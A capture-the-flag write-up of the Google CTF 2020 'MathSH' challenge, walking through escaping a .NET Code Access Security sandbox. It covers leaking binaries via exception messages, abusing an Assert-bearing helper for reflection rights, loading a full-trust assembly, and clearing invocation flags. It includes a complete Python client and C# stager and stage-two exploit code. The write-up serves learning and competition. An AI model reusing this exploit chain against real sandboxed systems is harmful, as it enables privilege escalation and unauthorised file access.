MathSH Writeup  
==============

**MathSH** was a very innovative challenge in the category sandbox escape.
Three members of our team - **ALLES!** - worked for several hours and
eventually drew first blood on this challenge. This writeup is split into
several parts, namely: dumping the binary, analysing the sandbox, gaining a
better primitive for code execution and finally escaping the sandbox.

The description *Calculator as a Service (CAAS)* already hints to
[CAS](https://docs.microsoft.com/en-us/dotnet/framework/misc/code-access-
security), a legacy .NET technology to run code in various level of trusts.

We are given a restricted "shell" to calculate math expressions:

```  
Welcome to Math Shell.  
Type exit() to close the shell, or help() for some help.  
Type expression to evaluate, e.g. Math.Log(1.2, 3.4) + 5.6.  
MathSH> Math.Sin(0.9)  
0.783326909627483  
```

In addition to the math calculations, the `help()` command reveals further
commands, notable the `__flag__()` function, as well as the `__global__`
namespace:

```  
MathSH> help()  
<Functions>  
memset  
memget  
memlist  
memclear  
array  
eval  
exit  
quit  
help  
__init__  
__flag__

<Namespaces>  
Math  
__global__  
```

Calling the `__flag__` function yields `Can't open flag file.`. Well, it seems
like we have to escape the sandbox first.

The names of the available functions (`Math.Sin` etc.) already hint that this
challenge is based on the .NET platform.  
Since the binary for the challenge is not given as a download, we first need
to figure out how to leak the binary from the server, in order to allow us to
reverse engineer it and come up with a plan on how to escape the sandbox.

## Leak primitives and dumping

The `__global__` namespace allows calling nearly arbitrary .NET functions,
although some restrictions apply:  
- The called method or issued property has to be static (member methods can't be called)  
- Only numbers, arrays of bytes and exception messages are printed to the console

Furthermore it's possible to nest the function calls. For instance, by
combining `ReadAllText` and querying the static getter
`AppContext.BaseDirectory`.

```  
MathSH>
__global__.System.IO.File.ReadAllText(__global__.System.AppContext.BaseDirectory)  
Could not find a part of the path 'C:\ctf\challenge\'.  
```

The above-used function `ReadAllText` allows leaking strings, since the
argument is reflected in the error message. We are pretty certain that there
are multiple ways to leak string objects via exception messages, this one just
happened to be the first one we found. By using `String.Concat` we can call
the `ToString` method on almost every object that overloads the base method.
Using this methodology we are able to list all the files in the current
directory:

```  
MathSH>
__global__.System.IO.File.ReadAllText(__global__.System.String.Concat(__global__.System.IO.Directory.EnumerateFiles(".",
"*")))  
Could not find a part of the path
'C:\ctf\challenge\Antlr3.Runtime.dll\GoogleCTF2020.exe\JScriptRunner.dll\SlimlineJScript.dll'.  
```

Since we already know that `C:\ctf\challenge\` is our base path, the resulting
files are:  
- Antlr3.Runtime.dll  
- GoogleCTF2020.exe  
- JScriptRunner.dll  
- SlimlineJScript.dll

Fortunately, the console prints `System.Byte[]` objects! Hence, we can
download the challenge binaries by calling:

```  
MathSH>  __global__.System.IO.File.ReadAllBytes("GoogleCTF2020.exe")  
77 # <= 0x4D  
90 # <= 0x5A = MZ Header  
[...]  
```

## Sandbox analysis

We can open the dumped binaries in [dnSpy](https://github.com/0xd4d/dnSpy) and
analyse the code. Lets start with the assembly of the host program,
`GoogleCTF2020.exe`. The only interesting method is `Program.SetupAppDomain`.
It's short enough to include it here:

```csharp  
public static void SetupAppDomain()  
{  
	PermissionSet permissionSet = new PermissionSet(PermissionState.None);  
	permissionSet.AddPermission(new SecurityPermission(SecurityPermissionFlag.Execution));  
	AppDomainSetup setupInformation = AppDomain.CurrentDomain.SetupInformation;  
	permissionSet.AddPermission(new FileIOPermission(FileIOPermissionAccess.Read | FileIOPermissionAccess.PathDiscovery, setupInformation.ApplicationBase));  
	Program._app_domain = AppDomain.CreateDomain("JScriptRunner", null, setupInformation, permissionSet, new List<StrongName>  
	{  
		Program.CreateStrongName(typeof(EntryPoint).Assembly)  
	}.ToArray());  
}  
```

This method creates a new `AppDomain` in which the sandboxed interactive shell
is spawned.  
Note that the list of strongly named assemblies that are fully trusted by the
`AppDomain` includes the main assembly that implements the interpreter
(`JScriptRunner`).  
This fact is abused later on. During the creation, two permissions are added
to the zero-permission sandbox:  
- **SecurityPermissionFlag.Execution**: Needed by the .NET Framework to execute code and assemblies inside the AppDomain  
- **FileIOPermission with Read | PathDiscovery in the ApplicationBase**: We are allowed to read and list files in the application base, which happens to be the working directory.

The assembly then wraps the interactive shell into the `JScriptRunner.dll`,
which implements the shell functionality and applies a lot of reflection magic
when types, methods and constructors are resolved.  
This assembly makes use of `SlimlineJScript.dll` and `Antlr3.Runtime.dll` to
process JScript commands.  
The following picture summarizes the setup:

![Assemblies](https://gist.github.com/bennofs/6a4466cdc746a5b994a32cfa923a9e8e/raw/cd3a26bc283cac8a6136415f81f450a664c16762/assemblies.svg)

We also see the `__flag__` method, which reads the flag file provided by the
`GoogleCTF2020.exe` host. But since the flag file is in the parent folder, we
can't access it due to the restrictions of the app domain. Furthermore, we
reveal the `__init__` method, which can be used to make exceptions terminate
the program and print the full exception details:

```  
MathSH> __init__(true)  
MathSH>
__global__.System.IO.File.ReadAllText(__global__.System.AppContext.BaseDirectory)  
System.IO.DirectoryNotFoundException: Could not find a part of the path
'C:\ctf\challenge\'.  
  at JScriptRunner.JScriptGlobal.WriteException(Exception ex)  
  at JScriptRunner.JSShell.Run()  
  at JScriptRunner.EntryPoint.Run(String flag_path, IShell shell)  
  at GoogleCTF2020.Program.RunShell(IShell shell)

Ncat: Broken pipe.  
```

More analysis reveals some more, but rather uninteresting facts: We can call
constructors of functions with the console and wrap `System.Object` elements
in the `array` command. But nothing to escape back to the host process.  
Some digging in our binaries yields the method
`JScriptRunner.JScriptUtils.CallMethodSecure`, which has the curious
annotation `SecuritySafeCritical` and also an interesting call to `Assert`.  
It's not used in the application, but we won't complain ;)

```csharp  
[SecuritySafeCritical]  
internal static object CallMethodSecure(object targetObject, string name, bool
case_sensitive, object[] args)  
{  
	new ReflectionPermission(PermissionState.Unrestricted).Assert();  
	return JScriptUtils.CallMethod(targetObject, name, case_sensitive, args);  
}  
```

So, let's read some of the Microsoft docs regarding [sandboxing and
CAS](https://docs.microsoft.com/en-us/dotnet/framework/misc/how-to-run-
partially-trusted-code-in-a-sandbox).  
The [Assert](https://docs.microsoft.com/en-
us/dotnet/api/system.security.permissionset.assert?view=dotnet-plat-ext-3.1)
function is of particular interest as it contains the warning:

> Because calling the Assert method removes the requirement that all code in
> the call chain must be granted permission to access the specified resource,
> it can open up security vulnerabilities if used incorrectly or
> inappropriately. Therefore, it should be used with great caution.

If a .NET application requests access to a specified resource, for example
reading files in the local directory, the .NET Framework checks if the calling
code possesses the privileges to do so. Internally, this works by walking up
the stack frames, checking if any method on the call stack is "sandboxed" and
not privileged to request this resource. The `Assert` function inserts a
special marker on the stack to stop the walk at this point.

Let's look at an example. We try to invoke a function that requires the
`ReflectionPermission` using the ordinary `CallMethod`.  
Then, the call stack will look like this:

![Call stack for
CallMethod](https://gist.github.com/bennofs/6a4466cdc746a5b994a32cfa923a9e8e/raw/cd3a26bc283cac8a6136415f81f450a664c16762/call-
stack.svg)

As you can see, there are stack frames from the partially trusted
`SlimlineJScript` above our invoked function. When checking for the reflection
permission, the .NET Framework will walk the stack from bottom to top and find
this stack frame. Because `SlimelineJScript` does not have the permission (it
only has the permissions granted to it by the restrictive appdomain), the
request is denied.

The next picture shows what happens if we instead use `CallMethodSecure`.  
The `Assert` call inserts a special marker on the stack that stops the stack
walk.  
Since all the stackframes between the marker and our invoked function are from
the `JScriptRunner` assembly, which is fully trusted, the request is granted.

![Call stack for
CallMethodSecure](https://gist.github.com/bennofs/6a4466cdc746a5b994a32cfa923a9e8e/raw/cd3a26bc283cac8a6136415f81f450a664c16762/call-
stack-secure.svg)

`CallMethodSecure` thus allows us to call arbitrary functions that can use the
`ReflectionPermission`. We can control which function is called with the
parameters passed to `CallMethodSecure`. The documentation of the
[ReflectionPermission](https://docs.microsoft.com/en-
us/dotnet/api/system.security.permissions.reflectionpermission?view=dotnet-
plat-ext-3.1) states:

> Without ReflectionPermission, code can use reflection to access only the
> public members of objects. Code with ReflectionPermission and the
> appropriate ReflectionPermissionFlag flags can access the protected and
> private members of objects.

Let's try to call `__flag__` function through the `CallMethodSecure` method
(since `CallMethodSecure` is `internal`, we need to use `CallMethod` to call
it):

```  
MathSH> __init__(true)  
MathSH>
__global__.JScriptRunner.JScriptUtils.CallMethod(__global__.JScriptRunner.JScriptUtils.GetMethod(__global__.JScriptRunner.JScriptUtils.FindType("JScriptRunner.JScriptUtils",true),
"CallMethodSecure",true,true,true,array(this,"__flag__",true,array())),this,array(this,"__flag__",true,array()))  
System.Reflection.TargetInvocationException: Exception has been thrown by the
target of an invocation. ---> System.Reflection.TargetInvocationException:
Exception has been thrown by the target of an invocation. --->
SlimlineJScript.EvaluationException: Can't open flag file.  
  at JScriptRunner.JScriptGlobal.__flag__()  
  --- End of inner exception stack trace ---  
  at System.RuntimeMethodHandle.InvokeMethod(Object target, Object[]
arguments, Signature sig, Boolean constructor)  
  at System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(Object obj,
Object[] parameters, Object[] arguments)  
  at System.Reflection.RuntimeMethodInfo.Invoke(Object obj, BindingFlags
invokeAttr, Binder binder, Object[] parameters, CultureInfo culture)  
  at JScriptRunner.JScriptUtils.CallMethod(Object targetObject, String name,
Boolean case_sensitive, Object[] args)  
  at JScriptRunner.JScriptUtils.CallMethodSecure(Object targetObject, String
name, Boolean case_sensitive, Object[] args)  
  --- End of inner exception stack trace ---  
  at JScriptRunner.JScriptGlobal.WriteException(Exception ex)  
  at JScriptRunner.JSShell.Run()  
  at JScriptRunner.EntryPoint.Run(String flag_path, IShell shell)  
  at GoogleCTF2020.Program.RunShell(IShell shell)  
```

Dang, we still can't query the flag since we only got `ReflectionPermission`
and the `FileIOPermission` still applies. But, nonetheless, we can see from
the stacktrace that this method is called via `CallMethodSecure`!

Some tooling minimized the effort to create such payloads, but after all, it
was quite confusing. If we only had a way to store `System.Object` elements in
order to reuse them later on...  
The method `memset` was promising, but at this point, we figured it would be
way better to load our own assemblies.  
We will explore that in the next section.

## Loading an assembly

To load an assembly, we want to call the `Assembly.Load` function.  
If we try to call this method directly, it will fail because we do not have
the reflection permission:

```  
MathSH>
__global__.System.Reflection.Assembly.Load(__global__.System.Convert.FromBase64String("...some
assembly as base64..."))  
Request for the permission of type
'System.Security.Permissions.ReflectionPermission, mscorlib, Version=4.0.0.0,
Culture=neutral, PublicKeyToken=b77a5c561934e089' failed.  
```

But we can use the trick from the previous section to call that function with
elevated privileges:

```  
MathSH>
__global__.JScriptRunner.JScriptUtils.CallMethod(__global__.JScriptRunner.JScriptUtils.GetMethod(__global__.JScriptRunner.JScriptUtils.FindType("JScriptRunner.JScriptUtils",true),"CallMethodSecure",true,true,true,array(__global__.JScriptRunner.JScriptUtils.FindType("System.Reflection.Assembly",true),"Load",true,array(__global__.JScriptRunner.JScriptUtils.FindType("System.Byte[]",true)))),this,array(__global__.JScriptRunner.JScriptUtils.FindType("System.Reflection.Assembly",true),"Load",true,array(__global__.System.Convert.FromBase64String("...some
assembly as base64..."))))

System.Reflection.TargetInvocationException: Exception has been thrown by the
target of an invocation. ---> System.Reflection.TargetInvocationException:
Exception has been thrown by the target of an invocation. --->
System.Security.SecurityException: Request failed.  
  at System.Reflection.RuntimeAssembly.nLoadImage(Byte[] rawAssembly, Byte[]
rawSymbolStore, Evidence evidence, StackCrawlMark& stackMark, Boolean
fIntrospection, Boolean fSkipIntegrityCheck, SecurityContextSource
securityContextSource)  
  at System.Reflection.Assembly.Load(Byte[] rawAssembly)  
  --- End of inner exception stack trace ---  
  ...  
  at JScriptRunner.JScriptUtils.CallMethodSecure(Object targetObject, String
name, Boolean case_sensitive, Object[] args)  
  ...  
```

Partial success: it is no longer the reflection permission that prevents us
from loading an assembly.  
But there is still an issue: the request to load the assembly fails!

Reading the documention for the
[`Assembly.Load`](https://docs.microsoft.com/en-
us/dotnet/api/system.reflection.assembly.load?view=netframework-4.7.2#System_Reflection_Assembly_Load_System_Byte___System_Byte___System_Security_SecurityContextSource_)
function reveals that there is a third parameter to specify the security
context of the loaded assembly.  
Local experiments show that the request to load an assembly at that point only
succeeds if we pass `CurrentAppDomain` as the security context, but this is
not what we want: Passing this as an argument, the loaded assembly becomes a
partial trust assembly, so all restrictions of the app domain will apply to it
with no way to use `Assert` to escape out of the sandbox.

Here another security feature of the .NET platform comes into play: [Security-
Transparent Code - Level 2](https://docs.microsoft.com/en-
us/dotnet/framework/misc/security-transparent-code-level-2).  
It turns out that in order to be allowed to load our assembly as full-trust
assembly, we have to make it `SecurityTransparent`.  
Thus, if we add the line `[assembly: SecurityTransparent]` to
`AssemblyInfo.cs` of our assembly and recompile, loading is successful.  
A simple test even confirms that we are running with full trust:

```csharp  
// in file AssemblyInfo.cs:  
[assembly: SecurityTransparent]

// in file Stager.cs:  
using System;  
using System.Reflection;

namespace Stager  
{  
   public class Stager  
   {  
       public static Boolean[] CheckTrust() // Boolean array so that the result is printed by the MathSH interpreter  
       {  
           return new Boolean[] { Assembly.GetExecutingAssembly().IsFullyTrusted };  
       }  
   }  
}  
```

Running this on the remote server returns:

```  
# load the assembly as before  
...  
MathSH> __global__.Stager.Stager.CheckTrust()  
1  
```

Looks like we can load assemblies, and they are running as full trust! ?  
Now, the only challenge that remains is to escape the limitations of security
transparent code.

## Escaping the sandbox

We are now able to run our own custom code in a fully-trusted assembly.  
But we are not able to call `Assert` since our code must be security
transparent (a security transparent assembly cannot contain any non-security
transparent code). So the final step is to find a way to load a second
assembly that is still fully trusted but can contain security critical code as
well.

To solve this, we first need to understand what prevented us from loading a
non-`SecurityTransparent` assembly in the first place. In the stack trace of
`CallMethodSecure` above, the stars show the security level of each function.
Red is `SecurityCritical`, orange stands for `SecuritySafeCritical` and no
color is `SecurityTransparent`. As we can see, the final method which invokes
our own code is `SecurityTransparent`. It makes sense that this won't allow us
to load any `SecurityCritical` or `SecuritySafeCritical` code, because that
could bypass the restriction of a `SecurityTransparent` method.

So we need to find another function to invoke our security critical code.  
Luckily, `JScriptRunner.ExpressionResolver.EvaluateFunction` fits our
requirements. This method is `SecurityCritical` and has an `Invoke` inside,
controlled by parameters. The only problem is that we cannot call this
function directly, because we are security transparent and thus not allowed to
call security critical methods.

However, we can bypass this restriction using reflection. With reflection, a
method call is split into two steps: first, a `MethodInfo` is looked up and
then that `MethodInfo` is invoked to perform the call. How does this work with
the security levels? Somehow, the runtime needs to be able to know what
security level is required when calling `Invoke` on a `MethodInfo` instance.

Turns out that the runtime simply saves that information in a private field
`m_invocationFlags` inside the `MethodInfo` itself. The `Invoke` method then
checks if the `NEED_SECURITY` flag is set:

```csharp  
if ((invocationFlags & INVOCATION_FLAGS.INVOCATION_FLAGS_NEED_SECURITY) !=
INVOCATION_FLAGS.INVOCATION_FLAGS_UNKNOWN)  
{  
   RuntimeMethodHandle.PerformSecurityCheck(obj, this, this.m_declaringType,
(uint)this.m_invocationFlags);  
}  
```

With some reflection magic, we can set that field and remove the the
`NEED_SECURITY` flag:

```csharp  
public static void resetInvocationFlags(Object field) {  
   var flagsField = field.GetType().GetField(  
      "m_invocationFlags",   
      BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Static  
   );  
   flagsField.SetValue(field,  
       flagsField.FieldType.GetField("INVOCATION_FLAGS_INITIALIZED")  
	.GetValue(null));  
}  
```

Using the attached script, we can run our exploit (`stager` loads the first
assembly, `stage2` loads the second one):

```  
$ ./repl.py  
[+] Opening connection to mathsh.2020.ctfcompetition.com on port 1337: Done  
Welcome to Math Shell.  
Type exit() to close the shell, or help() for some help.  
Type expression to evaluate, e.g. Math.Log(1.2, 3.4) + 5.6.  
$ stager

$ stage2  
constructed jsshell  
got resolver  
Launching assembly  
stage2 result: CTF{C#_is_the_best_programming_language_change_my_mind}  
```

## Code

### Python Client

```python  
#!/usr/bin/env python3  
from __future__ import unicode_literals  
from pwn import *  
from prompt_toolkit import PromptSession  
from prompt_toolkit.lexers import PygmentsLexer  
from pygments.lexers.dotnet import CSharpLexer

r = remote("mathsh.2020.ctfcompetition.com", 1337)

REPLACEMENTS = {  
   'System': '__global__.System',  
   'ASCII': '__global__.System.Text.Encoding.ASCII',  
   'ReadAllBytes': '__global__.System.IO.File.ReadAllBytes',  
   'CallMethod': '__global__.JScriptRunner.JScriptUtils.CallMethod',  
   '"CallMethod': '"CallMethod',  
   '"CallMethod': '"CallMethod',  
   'GetMethod': '__global__.JScriptRunner.JScriptUtils.GetMethod',  
   'FindType': "__global__.JScriptRunner.JScriptUtils.FindType",  
}

GLOBAL_RE = re.compile(r'(' + '|'.join(re.escape(mod) for mod in REPLACEMENTS)
+ ')')  
def preprocess(code):  
   def rep_func(match):  
       return REPLACEMENTS[match.group(1)]

   code = GLOBAL_RE.sub(rep_func, code)  
   return code

def save_bytes(out):  
   bs = bytes(int(x) for x in out.split('\n') if x)  
   with open("dump.bin", "wb") as f:  
       f.write(bs)  
   return "saved to dump.bin"

def call_secure(cls, method, *args):  
   method_args = ','.join(str(x) for x in args)  
   cls_type = f'__global__.JScriptRunner.JScriptUtils.FindType("{cls}", true)'  
   call_args = f'{cls_type},"{method}",true,array({method_args})'  
   return f'''  
   __global__.JScriptRunner.JScriptUtils.CallMethod(  
     __global__.JScriptRunner.JScriptUtils.GetMethod(  
        __global__.JScriptRunner.JScriptUtils.FindType("JScriptRunner.JScriptUtils", true),   
        "CallMethodSecure",   
        true,   
        true,   
        true,  
        array({call_args})  
     ),  
     null,  
     array({call_args})  
   )  
   '''.replace("\n", "").replace(" ", "")

session = PromptSession(lexer=PygmentsLexer(CSharpLexer))  
handle = lambda x: x  
while True:  
   try:  
       out = r.recvuntil("MathSH> ", drop=True).decode()  
       print(handle(out).strip())  
   except EOFError:  
       r.stream()  
       break

   inp = preprocess(session.prompt("$ "))

   handle = lambda x: x  
   if inp.startswith("dumpstr "):  
       inp = inp[8:]  
       inp = f'__global__.System.IO.File.ReadAllText(__global__.System.Convert.ToString({inp}))'  
   if inp.startswith("call "):  
       pass  
   if inp.startswith("dumpbin "):  
       inp = inp[8:]  
       handle = save_bytes  
   if inp.startswith("load "):  
       fname = inp[5:]  
       with open(fname, "rb") as f:  
           data = base64.b64encode(f.read()).decode()  
       inp = call_secure('System.Reflection.Assembly', 'Load', f'__global__.System.Convert.FromBase64String("{data}")')  
   if inp.startswith("callsecure "):  
       inp = call_secure(*inp.split()[1:])  
   if inp == "stager":  
       with open("Stager.dll", "rb") as f:  
           data = base64.b64encode(f.read()).decode()  
       inp = call_secure('System.Reflection.Assembly', 'Load', f'__global__.System.Convert.FromBase64String("{data}")')  
   if inp == "stage2":  
       with open("Stage2.dll", "rb") as f:  
           data = base64.b64encode(f.read()).decode()  
       inp = call_secure('Stager.Stager', 'Run', 'this', f'__global__.System.Convert.FromBase64String("{data}")')

   r.sendline(inp)  
```

### Stager

```csharp  
using JScriptRunner;  
using SlimlineJScript;  
using SlimlineJScript.Domain;  
using System;  
using System.Reflection;

namespace Stager  
{  
   public class Stager  
   {  
       [System.Security.SecuritySafeCritical]  
       public static void CheckTrust()  
       {  
           Console.WriteLine(Assembly.GetExecutingAssembly().IsFullyTrusted);  
       }

       public static void resetInvocationFlags(Object field)  
       {  
           var flagsField = field.GetType().GetField("m_invocationFlags", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Static);  
           flagsField.SetValue(field, flagsField.FieldType.GetField("INVOCATION_FLAGS_INITIALIZED").GetValue(null));  
       }

       public static Object getPrivateField(Object v, String name)  
       {  
           var field = v.GetType().GetField(name, BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public);  
           resetInvocationFlags(field);  
           return field.GetValue(v);  
       }

       public static MethodInfo getMethod(Object v, String name)  
       {  
           var mi = v.GetType().GetMethod(name, BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Static);  
           resetInvocationFlags(mi);  
           return mi;  
       }

       public static void Run(JScriptGlobal self, byte[] stage2)  
       {  
           // get the shell so that we can produce output easily  
           var shellField = self.GetType().GetFields(BindingFlags.NonPublic | BindingFlags.Instance)[0];  
           IShell shell = (IShell)shellField.GetValue(self);

           // construct a new resolver so that we can call methods on it  
           var jsShellType = Assembly.GetAssembly(self.GetType()).GetType("JScriptRunner.JSShell");  
           var constr = jsShellType.GetConstructors()[0];  
           resetInvocationFlags(constr);

           var jsShell = constr.Invoke(new object[]  
           {  
               "..\\flag.txt",  
               shell,  
           });  
           shell.WriteLine("constructed jsshell");

           Object resolver = getPrivateField(jsShell, "_resolver");  
           shell.WriteLine("got resolver");

           // launch the stage2 assembly  
           shell.WriteLine("Launching assembly");  
           var args = new FunctionArgs();  
           var payload = new ValueExpression(stage2, SlimlineJScript.Domain.ValueType.String);  
           args.Parameters = new Expression[] { new Expression(payload) };  
           getMethod(resolver, "EvaluateFunction").Invoke(resolver, new object[] { null, "__global__.System.Reflection.Assembly.Load", args, null, true });

           var t = JScriptUtils.FindType("Stage2.Stage2", true);  
           var m = t.GetMethod("Run");  
           resetInvocationFlags(m);  
           shell.WriteLine("stage2 result: " + m.Invoke(null, new object[] { }));  
       }

   }  
}  
```

### Stage2

```csharp  
using System;  
using System.IO;  
using System.Security;  
using System.Security.Permissions;

namespace Stage2  
{  
   public class Stage2  
   {  
       public static String Run()  
       {  
           new PermissionSet(PermissionState.Unrestricted).Assert();  
           return File.ReadAllText("../flag.txt");  
       }  
   }  
}  
```

Original writeup
(https://gist.github.com/bennofs/6a4466cdc746a5b994a32cfa923a9e8e).